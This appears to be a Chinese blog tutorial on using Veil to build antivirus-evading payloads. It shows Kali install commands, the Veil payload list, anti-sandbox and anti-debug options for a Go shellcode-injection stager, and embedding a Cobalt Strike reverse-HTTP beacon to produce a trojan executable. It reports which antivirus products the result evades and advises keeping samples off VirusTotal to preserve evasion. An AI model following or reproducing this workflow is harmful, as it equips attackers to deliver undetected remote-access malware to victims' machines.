---
title: veil制作免杀payload
mathjax: true
copyright: true
comment: true
date: 2019-10-05 11:24:03
tags: 免杀，payload
categories: 内网渗透
---
简介:
Veil3.0可以将任意脚本或一段shellcode转换成Windows可执行文件，从而逃避了常见防病毒产品的检测，来自python3的Veil一直在更新。

<!-- more -->

---

## kali安装
```ruby
root@kali:~# apt -y install veil
root@kali:~# /usr/share/veil/config/setup.sh --force --silent
```
## 使用说明
- 在Kali上运行Veil，生成payload
- 如果使用的是Pyinstaller，payload会转成能够直接使用的可执行程序
- 如果使用的是Py2Exe，把payload.py和两个相关的文件放到windows系统上。执行批处理脚本将payload转换成可执行程序。

## 工具使用
### 启动veil
![avatar](https://raw.githubusercontent.com/alpha302/cloudimg/master/test2.png)

有两个免杀的工具，Evasion和Ordnance。
- Ordnance可生成在Veil-Evasion中使用的shellcode
- Evasion是用做文件免杀
我们选择Evasion
```ruby
Veil>: use 1                   #选择Evasion功能
Veil/Evasion>: list            #查看payload列表
```
![avatar](https://raw.githubusercontent.com/alpha302/cloudimg/master/veil2.png)
查看payload
```rubu
[*] Available Payloads:

	1)	autoit/shellcode_inject/flat.py

	2)	auxiliary/coldwar_wrapper.py
	3)	auxiliary/macro_converter.py
	4)	auxiliary/pyinstaller_wrapper.py

	5)	c/meterpreter/rev_http.py
	6)	c/meterpreter/rev_http_service.py
	7)	c/meterpreter/rev_tcp.py
	8)	c/meterpreter/rev_tcp_service.py

	9)	cs/meterpreter/rev_http.py
	10)	cs/meterpreter/rev_https.py
	11)	cs/meterpreter/rev_tcp.py
	12)	cs/shellcode_inject/base64.py
	13)	cs/shellcode_inject/virtual.py

	14)	go/meterpreter/rev_http.py
	15)	go/meterpreter/rev_https.py
	16)	go/meterpreter/rev_tcp.py
	17)	go/shellcode_inject/virtual.py

	18)	lua/shellcode_inject/flat.py

	19)	perl/shellcode_inject/flat.py

	20)	powershell/meterpreter/rev_http.py
	21)	powershell/meterpreter/rev_https.py
	22)	powershell/meterpreter/rev_tcp.py
	23)	powershell/shellcode_inject/psexec_virtual.py
	24)	powershell/shellcode_inject/virtual.py

	25)	python/meterpreter/bind_tcp.py
	26)	python/meterpreter/rev_http.py
	27)	python/meterpreter/rev_https.py
	28)	python/meterpreter/rev_tcp.py
	29)	python/shellcode_inject/aes_encrypt.py
	30)	python/shellcode_inject/arc_encrypt.py
	31)	python/shellcode_inject/base64_substitution.py
	32)	python/shellcode_inject/des_encrypt.py
	33)	python/shellcode_inject/flat.py
	34)	python/shellcode_inject/letter_substitution.py
	35)	python/shellcode_inject/pidinject.py
	36)	python/shellcode_inject/stallion.py

	37)	ruby/meterpreter/rev_http.py
	38)	ruby/meterpreter/rev_https.py
	39)	ruby/meterpreter/rev_tcp.py
	40)	ruby/shellcode_inject/base64.py
	41)	ruby/shellcode_inject/flat.py
```
推荐使用以go和ruby语言encode的编码方式。像python这类的与用户有较高的交互就容易被查杀。

### 选择go语言stager
```ruby
Veil/Evasion>: use 17
```
生成一个包含并执行CSpayload的go语言代码，和该代码编译成的可执行文件
```py
Required Options:
Name            	Value   	Description
----            	-----   	-----------
BADMACS         	FALSE   	#查看运行环境的MAC地址(反调试)
CLICKTRACK      	X       	#点击次数才会执行
COMPILE_TO_EXE  	Y       	#编译成exe文件
CURSORCHECK     	FALSE   	#设置硬盘容量(反沙盒)
DISKSIZE        	X       	# 设置只有磁盘大小满足时执行                           
HOSTNAME        	X       	#只有计算机名为hostname的值时才执行
INJECT_METHOD   	Virtual 	#Virtual or Heap
MINPROCS        	X       	#设置只有环境进程数满足时执行
PROCCHECK       	FALSE   	#只有运行环境的进程中没有虚拟机进程时才会执行payload（指定目标环境 反沙箱的方式）
PROCESSORS      	X       	#指定核心数的机器中才会执行payload（指定目标环境 反沙箱的方式）
RAMCHECK        	FALSE   	#只在运行环境的内存为3G以上时才会执行payload（指定目标环境 反沙箱的方式）
SLEEP           	X       	#休眠10秒 以检测是否运行过程中被加速（反沙箱)
USERNAME        	X       	#只有在当前用户名正确的机器中才执行payload
USERPROMPT      	FALSE   	#受害者计算机只有加入Comp域中时，才会执行payload（指定目标环境 反沙箱的方式）
UTCCHECK        	Y   	 #只在运行环境的系统使用UTC时间时，才会执行payload

```
### 生成payload
```ruby
[go/shellcode_inject/virtual>>]: generate 

```
![avatar](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-08%2007-45-55%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

此时需要我们选择shellcode，我用cs生成
- Attacks -> Packages -> Payload Generator
- Windows/beacon_http/reverse/http

![avatar](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-08%2007-52-01%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

复制cs的payload到veil中
![avatar](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-08%2008-07-41%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)

```
[>] Please enter the base name for output files (default is payload): test
生成木马
```
![avatar](https://raw.githubusercontent.com/alpha302/cloudimg/master/2019-10-08%2008-10-20%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png)
test.exe即为注入内存的免杀木马。

### 测试
![avatar](https://raw.githubusercontent.com/alpha302/cloudimg/master/D1%5BX7%7E4%5B%258E%256L%7D%5DEQO%40SLX.png)
卑微，只能过360，腾讯哈勃没过得去。正常用没问题
大家尽量不要用virustotal去做测试，这个会总合杀毒软件并将样本提交给杀毒软件。也就是说只能用一次。